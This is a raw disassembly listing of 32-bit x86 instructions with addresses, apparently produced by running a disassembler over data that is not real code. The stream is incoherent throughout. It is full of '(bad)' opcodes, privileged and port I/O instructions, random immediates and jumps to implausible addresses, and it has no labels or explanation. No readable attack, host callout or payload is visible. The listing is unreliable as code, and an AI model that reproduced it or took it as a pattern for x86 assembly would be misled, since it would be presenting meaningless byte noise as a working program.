  41650b:	outs   dx,DWORD PTR ds:[esi]
  41650c:	js     0x4164d9
  41650e:	push   ds
  41650f:	data16 jae 0x416519
  416512:	sbb    eax,0xbccbf5f3
  416517:	cli    
  416518:	push   ss
  416519:	mov    esp,0x605cf2cf
  41651e:	inc    edx
  41651f:	call   0xb82e69e
  416524:	xor    dh,BYTE PTR [edx+0x5d964ac2]
  41652a:	mov    cl,0x14
  41652c:	pop    ecx
  41652d:	pusha  
  41652e:	dec    edx
  41652f:	adc    esp,edi
  416531:	sbb    dh,cl
  416533:	or     dl,cl
  416535:	push   ebp
  416536:	sti    
  416537:	push   esi
  416538:	loope  0x416522
  41653a:	mov    al,0x17
  41653c:	push   0xffffffb6
  41653e:	out    dx,eax
  41653f:	push   0x21995d20
  416544:	mov    ecx,0xb1511253
  416549:	mov    bl,0xf9
  41654b:	mov    bl,0xaa
  41654d:	ror    BYTE PTR [eax-0x33],cl
  416550:	imul   esp,DWORD PTR [eax+0x6e44ed2a],0x49dba67d
  41655a:	mov    bh,0xb9
  41655c:	enter  0x5f52,0x2
  416560:	mov    ebx,DWORD PTR [ebp-0x4]
  416563:	hlt    
  416564:	mov    ds:0x995c937a,eax
  416569:	rol    cl,0x1e
  41656c:	push   eax
  41656d:	bound  edi,QWORD PTR es:[edi]
  416570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416571:	mov    esp,0xc6743c66
  416576:	mov    bl,0xf3
  416578:	in     al,0x2c
  41657a:	cwde   
  41657b:	xor    DWORD PTR [esi+esi*1-0x4ed3721b],edi
  416582:	mov    esi,0x6e2984e4
  416587:	jno    0x4165e8
  416589:	stc    
  41658a:	xchg   ecx,eax
  41658b:	mov    dl,0xe8
  41658d:	push   cs
  41658e:	popf   
  41658f:	neg    ebp
  416591:	xchg   ebx,eax
  416592:	cmc    
  416593:	pop    ds
  416594:	jg     0x416590
  416596:	sbb    dl,BYTE PTR [edi-0x3b]
  416599:	retf   0x421c
  41659c:	daa    
  41659d:	dec    DWORD PTR [esi+0x7f]
  4165a0:	stc    
  4165a1:	xchg   esp,eax
  4165a2:	adc    eax,0x9393cc76
  4165a7:	or     al,BYTE PTR [ecx+0x1d14f3f6]
  4165ad:	mov    eax,ds:0x5f1d799f
  4165b2:	push   cs
  4165b3:	adc    DWORD PTR [esi-0x44e1b8c7],0x9d9a74a4
  4165bd:	retf   
  4165be:	out    dx,eax
  4165bf:	mov    bl,0x72
  4165c1:	(bad)  
  4165c2:	xor    eax,0xd9568da4
  4165c7:	add    esp,ebx
  4165c9:	xchg   esp,eax
  4165ca:	imul   ecx,DWORD PTR [eax],0xe2753011
  4165d0:	mov    eax,0x983525e
  4165d5:	xchg   esi,eax
  4165d6:	inc    ebx
  4165d7:	xor    DWORD PTR [ecx],0x4a
  4165da:	int    0x75
  4165dc:	lods   eax,DWORD PTR ds:[esi]
  4165dd:	mov    ds:0xd797c113,eax
  4165e2:	lock ret 0x6229
  4165e6:	ja     0x41662c
  4165e8:	dec    esp
  4165e9:	sub    al,0xd0
  4165eb:	mov    al,0x6d
  4165ed:	push   edx
  4165ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165ef:	inc    ebx
  4165f0:	add    eax,0x3cc77318
  4165f5:	sub    eax,0x9b2b5546
  4165fa:	xlat   BYTE PTR ds:[ebx]
  4165fb:	ret    0x9253
  4165fe:	jns    0x4165a4
  416600:	lods   al,BYTE PTR ds:[esi]
  416601:	fwait
  416602:	in     eax,0x11
  416604:	fadd   QWORD PTR [ebp+0x72]
  416607:	or     eax,DWORD PTR [ebp+eax*1+0x9c579d8]
  41660e:	shr    DWORD PTR [ecx],0x10
  416611:	retf   
  416612:	and    bl,BYTE PTR [esi]
  416614:	adc    DWORD PTR [ebp+0x1161d789],eax
  41661a:	nop
  41661b:	ror    DWORD PTR [ecx-0x6709c73e],1
  416621:	and    BYTE PTR [esi-0x48],0x91
  416625:	mov    edi,0x1372e6b2
  41662a:	push   esp
  41662b:	jp     0x4165cb
  41662d:	cmp    ebx,edx
  41662f:	and    eax,DWORD PTR [edx+0x2e49d345]
  416635:	scas   al,BYTE PTR es:[edi]
  416636:	neg    ebx
  416638:	bound  esp,QWORD PTR [ebx]
  41663a:	call   0x403a8b1
  41663f:	les    esp,FWORD PTR [edx+0x6f]
  416642:	push   0xffffffa9
  416644:	mov    edi,0x99c2f156
  416649:	in     eax,0x22
  41664b:	icebp  
  41664c:	mov    eax,0x9faa34f8
  416651:	stos   DWORD PTR es:[edi],eax
  416652:	punpckhdq mm7,mm5
  416655:	scas   al,BYTE PTR es:[edi]
  416656:	cli    
  416657:	pop    esp
  416658:	hlt    
  416659:	je     0x416687
  41665b:	sbb    eax,0x409ae806
  416660:	mov    edx,0x307e7195
  416665:	pop    eax
  416666:	outs   dx,DWORD PTR ds:[esi]
  416667:	dec    esi
  416668:	sub    ch,dl
  41666a:	add    ebp,edx
  41666c:	push   ebp
  41666d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41666e:	and    bh,BYTE PTR [eax+0x24]
  416671:	mov    ecx,0x5209cd55
  416676:	push   0xa56db231
  41667b:	imul   eax,DWORD PTR [ebp+edx*4-0x578e3365],0xeb3ef5b8
  416686:	out    dx,al
  416687:	pop    ebp
  416688:	cmp    DWORD PTR [edx-0x7b],eax
  41668b:	aam    0xea
  41668d:	jno    0x4166a2
  41668f:	(bad)
  416692:	add    esi,eax
  416694:	jmp    0x59707e4d
  416699:	mov    ?,WORD PTR [ecx+ecx*1+0x44e423bb]
  4166a0:	dec    ebx
  4166a1:	fs ret 
  4166a3:	xchg   edi,eax
  4166a4:	mov    al,0x16
  4166a6:	cmp    BYTE PTR [eax+0x7c],al
  4166a9:	ins    BYTE PTR es:[edi],dx
  4166aa:	dec    eax
  4166ab:	pop    edx
  4166ac:	cmp    edi,DWORD PTR [edx+ecx*8+0x69212047]
  4166b3:	dec    ebp
  4166b4:	adc    al,0x22
  4166b6:	adc    bl,cl
  4166b8:	add    al,BYTE PTR [ebx]
  4166ba:	sar    DWORD PTR [edx-0x56ffe8c4],1
  4166c0:	adc    BYTE PTR es:[ebx-0x15],bl
  4166c4:	inc    esi
  4166c5:	mov    ?,WORD PTR [ebp+eiz*1-0x3c38c384]
  4166cc:	mov    bh,0x16
  4166ce:	cmp    al,0xaf
  4166d0:	popa   
  4166d1:	jo     0x41674a
  4166d3:	cwde   
  4166d4:	push   esi
  4166d5:	mov    esi,0x405042a8
  4166da:	or     dh,ah
  4166dc:	cmp    BYTE PTR [esi-0x60],ch
  4166df:	xchg   BYTE PTR [esi-0x43c2f66c],ch
  4166e5:	cld    
  4166e6:	adc    bh,cl
  4166e8:	loop   0x4166d3
  4166ea:	lea    edi,[edi-0x57]
  4166ed:	lea    esi,[edi]
  4166ef:	add    esi,DWORD PTR [eax+0x541244f4]
  4166f5:	push   edx
  4166f6:	(bad)  
  4166f8:	test   DWORD PTR [ecx+0x730a5e05],edx
  4166fe:	sub    BYTE PTR [esi],al
  416700:	push   ds
  416701:	adc    BYTE PTR [eax-0x1d],0x32
  416705:	bound  ebx,QWORD PTR [ebx-0x6e2c5243]
  41670b:	push   0x33d2e510
  416710:	jne    0x41671f
  416712:	or     al,0x67
  416714:	push   ebp
  416715:	cmp    DWORD PTR [edx-0x3],0xec88871e
  41671c:	rcl    BYTE PTR [edi+0x9],cl
  41671f:	scas   eax,DWORD PTR es:[edi]
  416720:	dec    bl
  416722:	ja     0x41673b
  416724:	mov    eax,ds:0x8d55ada3
  416729:	popf   
  41672a:	sbb    edx,ebp
  41672c:	cmp    al,0x42
  41672e:	dec    ebx
  41672f:	ficom  DWORD PTR [esp+edx*4+0x1cf34c7a]
  416736:	bound  ebp,QWORD PTR [ebp+0x6b521639]
  41673c:	int    0xd
  41673e:	fcom   DWORD PTR [edi]
  416740:	push   eax
  416741:	ficom  WORD PTR [ebp+0x1ee94b3c]
  416747:	jbe    0x4167af
  416749:	jge    0x4166ea
  41674b:	pop    esi
  41674c:	mov    ecx,0xf0231d86
  416751:	jne    0x4166ec
  416753:	ins    BYTE PTR es:[edi],dx
  416754:	call   0x1e386e6e
  416759:	mov    ecx,0x3740b67e
  41675e:	js     0x4167d8
  416760:	pop    ds
  416761:	mov    edi,0xa36625e8
  416766:	popa   
  416767:	mov    ch,0xac
  416769:	les    edx,FWORD PTR [eax]
  41676b:	mov    edi,0x38fd8b01
  416770:	cld    
  416771:	or     esp,edi
  416773:	push   0x34
  416775:	cmp    esi,DWORD PTR [eax+0x3296c90d]
  41677b:	mov    al,ds:0xf46b46a9
  416780:	pop    ecx
  416781:	inc    esp
  416782:	push   edi
  416783:	pop    eax
  416784:	shl    BYTE PTR [edi+edx*4-0x58a1f9e8],0x71
  41678c:	sbb    DWORD PTR [eax+edi*8],ebp
  41678f:	cmp    DWORD PTR [edx],0x687872db
  416795:	mov    dh,0x14
  416797:	loope  0x4167af
  416799:	pusha  
  41679a:	mov    esi,0x12b9dc61
  41679f:	push   ss
  4167a0:	fidivr DWORD PTR [edi]
  4167a2:	out    dx,al
  4167a3:	cli    
  4167a4:	and    eax,0xd5f3a349
  4167a9:	ror    DWORD PTR [ebp-0x72],0x6e
  4167ad:	fs out dx,eax
  4167af:	jge    0x416765
  4167b1:	fisub  WORD PTR [ecx]
  4167b3:	mov    esp,DWORD PTR [edx+0x70]
  4167b6:	cmc    
  4167b7:	outs   dx,DWORD PTR ds:[esi]
  4167b8:	or     edx,esp
  4167ba:	mov    bh,0x94
  4167bc:	dec    ebx
  4167bd:	idiv   DWORD PTR [esp+edi*4-0x470f9772]
  4167c4:	(bad)  
  4167c5:	mov    ds:0xb2066a1,al
  4167ca:	and    dh,bl
  4167cc:	xchg   edi,eax
  4167cd:	repz std 
  4167cf:	mov    ch,0x94
  4167d1:	jg     0x416821
  4167d3:	std    
  4167d4:	jns    0x416798
  4167d6:	hlt    
  4167d7:	popf   
  4167d8:	sbb    eax,0xa2246bfe
  4167dd:	mov    edx,0x546e3f98
  4167e2:	xchg   ebx,eax
  4167e3:	dec    ecx
  4167e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e5:	int3   
  4167e6:	sub    DWORD PTR [ebx-0x1a],edi
  4167e9:	fwait
  4167ea:	pop    edx
  4167eb:	fwait
  4167ec:	ret    0x97d0
  4167ef:	mov    esp,0xc0d33bed
  4167f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167f5:	cmp    DWORD PTR [ebx],0xad6fc135
  4167fb:	mov    eax,DWORD PTR [edi+0x1c]
  4167fe:	mov    ebp,0x4b14f8a0
  416803:	mov    esi,0xa4701281
  416808:	lods   al,BYTE PTR ds:[esi]
  416809:	pushf  
  41680a:	dec    ebp
  41680b:	jno    0x4167d4
  41680d:	sub    al,dl
  41680f:	sub    eax,0xbd22ab9
  416814:	inc    ecx
  416815:	jns    0x416880
  416817:	add    DWORD PTR [ecx],0x57
  41681a:	dec    edx
  41681b:	mov    esp,0xbd027e3c
  416820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416821:	jno    0x416821
  416823:	(bad)  
  416825:	mov    ch,0x25
  416827:	or     edx,DWORD PTR [ecx+0x22]
  41682a:	xchg   esp,eax
  41682b:	cmp    DWORD PTR [edx-0x77a37e81],ebx
  416831:	cmp    DWORD PTR [esi+0x3e],edi
  416834:	mov    dl,0x11
  416836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416837:	hlt    
  416838:	shl    DWORD PTR [ebx+0x1316bf72],cl
  41683e:	ret    
  41683f:	push   cs
  416840:	and    BYTE PTR [eax+0x1c],al
  416843:	cld    
  416844:	repz clc 
  416846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416847:	shl    DWORD PTR [eax+0x1c07a886],cl
  41684d:	xor    ah,BYTE PTR [edi]
  41684f:	cld    
  416850:	adc    ecx,DWORD PTR [ecx+ebp*4-0x76]
  416854:	dec    esp
  416855:	dec    ebp
  416856:	inc    esi
  416857:	mov    ebx,edx
  416859:	and    BYTE PTR [ecx],ah
  41685b:	and    esp,DWORD PTR [eax+0x5c]
  41685e:	mov    dh,dh
  416860:	out    0x76,al
  416862:	or     esi,DWORD PTR [ecx+0x4f]
  416865:	sbb    BYTE PTR ds:[ebx],al
  416868:	aam    0x8
  41686a:	dec    ebp
  41686b:	out    0x2a,eax
  41686d:	sbb    BYTE PTR [ebp-0x16],ah
  416870:	loop   0x4168e6
  416872:	scas   al,BYTE PTR es:[edi]
  416873:	ret    
  416874:	aam    0x38
  416876:	xchg   ebp,eax
  416877:	pop    edi
  416878:	popf   
  416879:	gs mov dh,0x2f
  41687c:	or     BYTE PTR [esi+0x24f05588],cl
  416882:	fisttp DWORD PTR [ebp+eax*1-0x40]
  416886:	mov    eax,0x6dc5ae9e
  41688b:	popa   
  41688c:	adc    BYTE PTR [edi+0x4b078402],cl
  416892:	in     al,dx
  416893:	jb     0x4168d3
  416895:	fimul  WORD PTR [esi+0x5c]
  416898:	mov    eax,0x72795736
  41689d:	addr16 clc 
  41689f:	add    BYTE PTR [ecx+0x14ba2ce7],ch
  4168a5:	enter  0x8201,0xc0
  4168a9:	fnstsw WORD PTR [ebp+0x3a]
  4168ac:	cmp    eax,DWORD PTR [ecx-0x5b]
  4168af:	mov    ds:0xefea8931,eax
  4168b4:	mov    esi,0xc679189a
  4168b9:	xchg   esp,eax
  4168ba:	test   DWORD PTR [edx],edi
  4168bc:	popa   
  4168bd:	arpl   WORD PTR [edi-0x1a636820],cx
  4168c3:	arpl   WORD PTR [ecx],sp
  4168c5:	xor    dh,BYTE PTR [eax+0x32631649]
  4168cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168cc:	mov    ah,al
  4168ce:	jl     0x41693f
  4168d0:	adc    edi,DWORD PTR [ebx]
  4168d2:	in     al,0xd0
  4168d4:	add    BYTE PTR [ecx],0xad
  4168d7:	pop    edi
  4168d8:	mov    esi,0x2e86bfad
  4168dd:	cmp    al,al
  4168df:	xor    eax,0x7586095a
  4168e4:	clc    
  4168e5:	push   edx
  4168e6:	xlat   BYTE PTR ds:[ebx]
  4168e7:	sbb    eax,0xfd9d1af6
  4168ec:	pop    eax
  4168ed:	cwde   
  4168ee:	xchg   esp,eax
  4168ef:	xor    eax,0xe531a114
  4168f4:	mov    WORD PTR [eax+ebx*4],?
  4168f7:	and    BYTE PTR [edx],cl
  4168f9:	dec    ebx
  4168fa:	popf   
  4168fb:	jne    0x4168ca
  4168fd:	jmp    0x4168f2
  4168ff:	rcr    BYTE PTR [ebp-0x257afdeb],cl
  416905:	pop    es
  416906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416907:	mov    eax,ds:0x27498f88
  41690c:	xor    dl,BYTE PTR [edi+0xbe3455e]
  416912:	jmp    FWORD PTR [eax+edx*4+0xa408bd]
  416919:	or     al,0x68
  41691b:	cmp    DWORD PTR [esi+0x4e79528d],0xffffff99
  416922:	xchg   esi,eax
  416923:	sahf   
  416924:	pushf  
  416925:	aad    0xc5
  416927:	test   ecx,ebp
  416929:	mov    cl,0xe9
  41692b:	add    al,0x77
  41692d:	test   al,0x17
  41692f:	shr    BYTE PTR [esi],cl
  416931:	mov    bl,0xc2
  416933:	sbb    BYTE PTR [edx+edi*2-0x62445eea],dl
  41693a:	or     DWORD PTR ds:0xc5f4b766,ebx
  416940:	xor    DWORD PTR [eax-0x2dddabdc],esi
  416946:	jbe    0x4169c7
  416948:	xlat   BYTE PTR ds:[ebx]
  416949:	lock nop
  41694b:	cmp    edx,DWORD PTR [edx]
  41694d:	pop    esp
  41694e:	adc    BYTE PTR ds:0xf3f335c6,0x7f
  416955:	shl    BYTE PTR [edx+0x78],cl
  416958:	and    DWORD PTR [eax+edx*2+0x71],esp
  41695c:	scas   eax,DWORD PTR es:[edi]
  41695d:	test   al,0xdb
  41695f:	into   
  416960:	adc    ebx,esp
  416962:	sbb    al,0xd2
  416964:	dec    edx
  416965:	lock imul eax,DWORD PTR [bp+di],0xd0aeddf4
  41696d:	sar    DWORD PTR [eax+eiz*2-0x4f7b2745],0x85
  416975:	xor    al,0x34
  416977:	cmp    DWORD PTR [esi+0x1e],ebx
  41697a:	sti    
  41697b:	and    BYTE PTR [esi],ah
  41697d:	mov    dh,0x7a
  41697f:	push   esi
  416980:	mov    edx,ds
  416982:	cmp    al,0x71
  416984:	(bad)  
  416985:	sbb    eax,0x26a530fc
  41698a:	dec    sp
  41698c:	add    al,0x39
  41698e:	adc    BYTE PTR [ebx],ah
  416990:	mov    esi,0xbeb9aed1
  416995:	mov    BYTE PTR [eax+0x26c50b5d],bh
  41699b:	xor    DWORD PTR [esi-0x1c],edx
  41699e:	aaa    
  41699f:	out    0x8d,al
  4169a1:	sbb    al,BYTE PTR [edx+0x17d5d6e9]
  4169a7:	mov    ebp,0x7c5aaaac
  4169ac:	inc    edx
  4169ad:	jae    0x416977
  4169af:	retf   0xeba8
  4169b2:	push   0xffffffe7
  4169b4:	stos   BYTE PTR es:[edi],al
  4169b5:	dec    edi
  4169b6:	mov    ch,0x33
  4169b8:	(bad)  
  4169b9:	xlat   BYTE PTR ds:[ebx]
  4169ba:	out    0x49,al
  4169bc:	pop    ebp
  4169bd:	pop    esp
  4169be:	xor    DWORD PTR [edx-0x3e],edx
  4169c1:	loopne 0x416a11
  4169c3:	data16 je 0x416974
  4169c6:	xor    eax,0xacc17254
  4169cb:	sub    DWORD PTR [ebx],ecx
  4169cd:	int    0xe2
  4169cf:	pop    esp
  4169d0:	inc    ebx
  4169d1:	stos   DWORD PTR es:[edi],eax
  4169d2:	call   0x977a:0x635cfd38
  4169d9:	hlt    
  4169da:	push   cs
  4169db:	or     ecx,DWORD PTR [esi+eiz*4]
  4169de:	mov    ah,0xd4
  4169e0:	jo     0x4169ed
  4169e2:	inc    esi
  4169e3:	outs   dx,BYTE PTR ds:[esi]
  4169e4:	gs mov ebp,0x7cd196eb
  4169ea:	sbb    eax,0xd71941ee
  4169ef:	cmp    DWORD PTR [ebp-0xc],edx
  4169f2:	sbb    ebp,DWORD PTR [edx]
  4169f4:	sub    dh,al
  4169f6:	jmp    0x4169bd
  4169f8:	ret    0xd098
  4169fb:	push   edx
  4169fc:	pushf  
  4169fd:	into   
  4169fe:	das    
  4169ff:	sub    dh,dl
  416a01:	push   0xffffffcb
  416a03:	xchg   BYTE PTR [esi+ebp*4-0x6b],bh
  416a07:	push   edx
  416a08:	(bad)  
  416a09:	lods   al,BYTE PTR ds:[esi]
  416a0a:	add    eax,0x9f8bbff8
  416a0f:	aaa    
  416a10:	das    
  416a11:	fadd   st,st(1)
  416a13:	jmp    0x5903:0x5162f34
  416a1a:	pop    es
  416a1b:	push   edi
  416a1c:	jb     0x4169ef
  416a1e:	and    dl,0x25
  416a21:	push   esp
  416a22:	sub    DWORD PTR [esi-0x7aee9c1b],esp
  416a28:	fld    DWORD PTR [eax+0x55]
  416a2b:	pushf  
  416a2c:	pop    ecx
  416a2d:	jl     0x416a7d
  416a2f:	test   al,0x88
  416a31:	cmp    DWORD PTR [ebx-0x3e],0x4a
  416a35:	xor    bh,BYTE PTR [ecx+eiz*4-0x2]
  416a39:	jmp    0x988e97a1
  416a3e:	scas   al,BYTE PTR es:[edi]
  416a3f:	es mov edi,0xa35e706d
  416a45:	mov    ebp,0x78e89c4e
  416a4a:	std    
  416a4b:	xchg   esp,eax
  416a4c:	addr16 loope 0x4169f3
  416a4f:	sbb    eax,0xa74752f9
  416a54:	shl    ebp,cl
  416a56:	dec    edx
  416a57:	add    DWORD PTR [ebx-0x22],eax
  416a5a:	jmp    0x66b09eb4
  416a5f:	jo     0x416a6b
  416a61:	pop    ebp
  416a62:	mov    ebp,0x7d4e48c5
  416a67:	sar    DWORD PTR [ebx+0x315218be],cl
  416a6d:	xlat   BYTE PTR ds:[ebx]
  416a6e:	hlt    
  416a6f:	jecxz  0x416a8f
  416a71:	retf   
  416a72:	inc    edi
  416a73:	(bad)  
  416a74:	xchg   ebp,eax
  416a75:	ins    DWORD PTR es:[edi],dx
  416a76:	mov    ch,0xd8
  416a78:	inc    ecx
  416a79:	xchg   edx,eax
  416a7a:	mov    al,0xf6
  416a7c:	mov    dh,BYTE PTR [edx-0x1f9e99d3]
  416a82:	aam    0x37
  416a84:	not    edi
  416a86:	iret   
  416a87:	out    0x35,al
  416a89:	lahf   
  416a8a:	je     0x416b01
  416a8c:	jge    0x416a24
  416a8e:	out    dx,eax
  416a8f:	sti    
  416a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a91:	mov    al,ds:0xc6acd96d
  416a96:	inc    DWORD PTR [ebx+edx*8-0x47bd31]
  416a9d:	rcl    esi,cl
  416a9f:	in     al,dx
  416aa0:	icebp  
  416aa1:	lods   al,BYTE PTR ds:[esi]
  416aa2:	dec    ebx
  416aa3:	sti    
  416aa4:	neg    BYTE PTR [ebx]
  416aa6:	idiv   BYTE PTR [esi]
  416aa8:	xchg   BYTE PTR [eax+0x6b],dh
  416aab:	mov    bl,0x93
  416aad:	jbe    0x416b29
  416aaf:	pop    esp
  416ab0:	jno    0x416ae5
  416ab2:	or     ax,0xd43e
  416ab6:	int    0x34
  416ab8:	or     al,0x5f
  416aba:	push   esp
  416abb:	aaa    
  416abc:	mov    edi,0xc0aba5c0
  416ac1:	or     dh,dl
  416ac3:	outs   dx,BYTE PTR ds:[esi]
  416ac4:	ret    
  416ac5:	xchg   esp,eax
  416ac6:	push   esi
  416ac7:	pop    eax
  416ac8:	gs jle 0x416b1b
  416acb:	lock xchg DWORD PTR [eax],ebx
  416ace:	push   cs
  416acf:	mov    eax,DWORD PTR [esi+ebx*1+0x3d9450c1]
  416ad6:	fld    DWORD PTR [ebx-0x6b8803c4]
  416adc:	cmp    eax,0xb0e3fe82
  416ae1:	mov    BYTE PTR [ebp-0x6ea28521],0xc9
  416ae8:	mov    DWORD PTR [esi+eax*4],edx
  416aeb:	and    dh,0x68
  416aee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416aef:	mov    esp,0x49ff4e1
  416af4:	dec    edi
  416af5:	call   0x2b2e:0x1ce1eba6
  416afc:	stos   BYTE PTR es:[edi],al
  416afd:	jecxz  0x416b5b
  416aff:	dec    esi
  416b00:	js     0x416a95
  416b02:	xchg   DWORD PTR [ebp-0x61677a49],edx
  416b08:	outs   dx,DWORD PTR ds:[esi]
  416b09:	test   BYTE PTR ds:0x11afc809,bl
  416b0f:	xchg   ebx,eax
  416b10:	sub    eax,0xe0cf6a1e
  416b15:	or     cl,BYTE PTR [esp+edx*1+0x79]
  416b19:	in     eax,0x4a
  416b1b:	dec    eax
  416b1c:	arpl   bx,bp
  416b1e:	daa    
  416b1f:	jmp    0x416b4f
  416b21:	fs dec esp
  416b23:	pop    ss
  416b24:	sub    BYTE PTR [esi-0x236bd2f1],bh
  416b2a:	lock dec esp
  416b2c:	enter  0x576b,0x6d
  416b30:	sub    al,0x91
  416b32:	mov    edx,0x8fca28c0
  416b37:	add    al,0x6a
  416b39:	mov    WORD PTR [ebx+0x51801141],?
  416b3f:	iret   
  416b40:	mov    ebx,0x525a9e51
  416b45:	jne    0x416afd
  416b47:	fisttp WORD PTR fs:[ebp-0xd4a746]
  416b4e:	jne    0x416b4a
  416b50:	adc    eax,0xcc40f83a
  416b55:	jp     0x416b8b
  416b57:	mov    eax,0x3ddb3556
  416b5c:	xor    DWORD PTR [edx-0x420c4c64],ebx
  416b62:	adc    DWORD PTR [edx],0xffffff85
  416b65:	push   ds
  416b66:	sub    eax,0x7958bf71
  416b6b:	out    0x22,al
  416b6d:	jmp    0x416b68
  416b6f:	jbe    0x416af7
  416b71:	adc    al,0x25
  416b73:	inc    DWORD PTR [ebx+esi*1-0x570adc5e]
  416b7a:	cmp    bl,dh
  416b7c:	xchg   ecx,eax
  416b7d:	mov    edx,0xe9981f26
  416b82:	jg     0x416b40
  416b84:	or     bl,BYTE PTR [ebx-0x3d19667d]
  416b8a:	sbb    DWORD PTR [ebp+0x61],edx
  416b8d:	inc    eax
  416b8e:	sti    
  416b8f:	mov    ds:0x55678fe4,eax
  416b94:	mov    dh,0x19
  416b96:	mov    esp,0x8f71f34
  416b9b:	imul   edx,DWORD PTR [eax+edx*2],0xc
  416b9f:	shr    ebx,0x80
  416ba2:	(bad)  
  416ba3:	rcl    bl,cl
  416ba5:	popf   
  416ba6:	mov    BYTE PTR [edx],bh
  416ba8:	xlat   BYTE PTR ds:[ebx]
  416ba9:	xor    BYTE PTR [ebx+0x3d8551f1],ch
  416baf:	mov    ebx,DWORD PTR [edi-0x517d1847]
  416bb5:	stos   DWORD PTR es:[edi],eax
  416bb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bb7:	dec    edx
  416bb9:	int3   
  416bba:	mov    ebp,es
  416bbc:	cmp    eax,0xc4550227
  416bc1:	cmp    ecx,DWORD PTR [esi-0x38]
  416bc4:	outs   dx,BYTE PTR ds:[esi]
  416bc5:	push   eax
  416bc6:	push   edx
  416bc7:	(bad)  
  416bc9:	sahf   
  416bca:	add    dh,BYTE PTR ds:0x5a65e14b
  416bd0:	mov    esp,0xb4936353
  416bd5:	test   edi,0x1cc1ffb4
  416bdb:	mov    eax,ds:0x15c0eb81
  416be0:	dec    ebp
  416be1:	mov    dh,dh
  416be3:	or     al,0x72
  416be5:	aad    0xd6
  416be7:	inc    esi
  416be8:	iret   
  416be9:	packuswb mm1,QWORD PTR [ebx]
  416bec:	xor    eax,0x7b0cb10a
  416bf1:	in     al,0x49
  416bf3:	test   DWORD PTR [esi+ebp*1],ebp
  416bf6:	jge    0x416b8d
  416bf8:	int3   
  416bf9:	loope  0x416b9f
  416bfb:	push   esi
  416bfc:	jnp    0x416bbb
  416bfe:	(bad)  
  416bff:	mov    bl,0xb8
  416c01:	je     0x416c05
  416c03:	std    
  416c04:	adc    BYTE PTR [ebx+0xb],dh
  416c07:	ds mov cl,al
  416c0a:	add    DWORD PTR [ebp-0x2c912e0],0x93ac1cfe
  416c14:	mov    esp,0x9c61a5bc
  416c19:	pop    eax
  416c1a:	pop    ss
  416c1b:	imul   edi,DWORD PTR [esi+eax*1-0x29ed5c3d],0xffffffe7
  416c23:	test   al,0x5f
  416c25:	test   esi,esp
  416c27:	dec    ecx
  416c28:	mov    DWORD PTR [eiz*4-0x699f8b9b],edi
  416c2f:	es cmp eax,0xb973bc01
  416c35:	clc    
  416c36:	pop    ecx
  416c37:	sub    ah,BYTE PTR [esi+0x10]
  416c3a:	inc    eax
  416c3b:	push   ebp
  416c3c:	mov    ah,0x1
  416c3e:	xor    DWORD PTR [eax+0x45],edx
  416c41:	imul   ebx,DWORD PTR [eax+eax*4+0x34],0xfffffff7
  416c46:	dec    edx
  416c47:	lods   eax,DWORD PTR ds:[esi]
  416c48:	pop    edi
  416c49:	(bad)  
  416c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c4b:	mov    eax,ds:0xd862ebbd
  416c50:	xor    DWORD PTR [ebx+ebp*8-0x5a],edx
  416c54:	sub    bh,cl
  416c56:	inc    esi
  416c57:	loop   0x416c29
  416c59:	ds push ebx
  416c5b:	push   ss
  416c5c:	lock rcl BYTE PTR [eax-0x12dd2333],cl
  416c63:	aad    0x4c
  416c65:	pushf  
  416c66:	shl    BYTE PTR [ebx+0x54],cl
  416c69:	inc    eax
  416c6a:	into   
  416c6b:	cmp    al,0x6
  416c6d:	ins    DWORD PTR es:[edi],dx
  416c6e:	jecxz  0x416cd2
  416c70:	xor    al,BYTE PTR [edx+0x32]
  416c73:	push   ds
  416c74:	test   BYTE PTR [ecx],ah
  416c76:	sbb    edx,edx
  416c78:	jp     0x416c0d
  416c7a:	popf   
  416c7b:	sub    ecx,DWORD PTR [ebx+edi*8+0x2a0f4897]
  416c82:	repnz imul ecx,DWORD PTR [edi+0x5f0d5280],0xaa8f6fdf
  416c8d:	rcl    BYTE PTR fs:[esi+ebx*1],cl
  416c91:	pop    esi
  416c92:	outs   dx,BYTE PTR ds:[esi]
  416c93:	jge    0x416c6e
  416c95:	mov    ah,0xff
  416c97:	and    al,0x4e
  416c99:	mov    ebx,0xbc9e48dc
  416c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ca0:	daa    
  416ca1:	push   cs
  416ca2:	stos   DWORD PTR es:[edi],eax
  416ca3:	jb     0x416c65
  416ca5:	data16 adc al,BYTE PTR [ebx*8+0x17bb7632]
  416cad:	in     al,0x2f
  416caf:	mov    ds:0xb6ac782c,eax
  416cb4:	cmc    
  416cb5:	test   BYTE PTR [esi-0x7535f2b3],bl
  416cbb:	and    bl,cl
  416cbd:	(bad)  
  416cbe:	int    0xa2
  416cc0:	xchg   BYTE PTR [edi],al
  416cc2:	xchg   esi,eax
  416cc3:	aaa    
  416cc4:	inc    edx
  416cc5:	cmp    edi,esp
  416cc7:	ret    0xb28
  416cca:	jmp    0xea32:0xcb1bb5d
  416cd1:	mov    ecx,DWORD PTR [ebp+0x47]
  416cd4:	sub    DWORD PTR [edx+ebx*2+0x6a0d2fa5],0x0
  416cdc:	enter  0x3995,0x13
  416ce0:	and    BYTE PTR [ebp+ecx*4+0x8],ch
  416ce4:	or     dl,BYTE PTR [edi+ebp*8-0x5aec85f1]
  416ceb:	cmp    bl,BYTE PTR [edi-0x36]
  416cee:	inc    esp
  416cef:	test   edx,eax
  416cf1:	push   eax
  416cf2:	jmp    0x416d12
  416cf4:	mov    bh,0x7f
  416cf6:	jb     0x416d09
  416cf8:	not    BYTE PTR [ecx*1-0x1b3e3227]
